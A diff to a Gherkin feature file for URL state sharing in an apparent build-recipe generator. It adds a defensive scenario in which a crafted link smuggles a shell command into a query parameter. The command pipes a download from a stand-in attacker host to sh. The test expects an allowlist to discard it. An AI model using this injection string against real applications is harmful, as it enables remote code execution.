@@ -60,6 +60,14 @@ Feature: URL State Sharing and Collaborative Configuration
     And maps "aarch64" to canonical "arm64"
     And seamlessly updates the browser address bar to the modern canonical format
 
+  Scenario: Shared links cannot inject commands into generated build recipes
+    Given a user opens a crafted link "?platform=vm&dockerApp=x;%20curl%20evil.example|sh%20%23"
+    When the application decodes the shared criteria
+    Then every enumerated parameter is checked against its catalog allowlist
+    And the unknown "dockerApp" value is discarded
+    And the generated cloud-init Makefile contains no part of the injected command
+    And recipe generators re-validate criteria even when called directly through the CLI or API
+
   Scenario: Schema version remains locked unless deployed with breaking parameter changes
     Given the application undergoes non-breaking updates such as adding distros, recipes, or tips
     When URL state persistence generates links
